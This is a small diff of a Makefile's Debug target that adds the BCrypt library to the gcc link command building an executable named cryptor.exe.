@@ -16,7 +16,7 @@ Debug: $(SrcPath)/main.c $(SrcPath)/linker.ld | $(Config.h) $(Dpath)
 	@echo Header files Generated.
 
 	@echo [*] LINKING FILE...
-	gcc -g -T $(SrcPath)/Linker.ld  $(SrcPath)/main.c -o $(Dpath)/cryptor.exe -lCrypt32 -lWs2_32
+	gcc -g -T $(SrcPath)/Linker.ld  $(SrcPath)/main.c -o $(Dpath)/cryptor.exe -lCrypt32 -lWs2_32 -lBCrypt
 	@echo COMPLETED: file has been linked into a mn executable format!
 
 
